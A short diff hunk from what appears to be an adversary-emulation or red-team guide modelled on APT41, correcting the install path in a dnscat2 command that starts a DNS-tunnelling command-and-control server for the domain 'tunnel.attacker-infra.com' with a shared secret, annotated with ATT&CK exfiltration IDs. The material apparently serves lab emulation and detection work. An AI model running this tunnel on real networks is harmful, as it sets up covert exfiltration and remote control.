@@ -1322,7 +1322,8 @@ value for APT41 specifically.
 # --no-cache: disable caching for accuracy in lab testing
 # --secret: HMAC symmetric encryption key → prevents eavesdroppers from injecting commands
 # Without --secret the sub-technique would be T1048.003 (unencrypted); with it: T1048.001
-ruby /opt/tools/dnscat2/dnscat2.rb \
+# dnscat2 Kali package installs server to /usr/share/dnscat2/server/dnscat2.rb
+ruby /usr/share/dnscat2/server/dnscat2.rb \
   --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
   --no-cache \
   --secret="DragonRx2024"
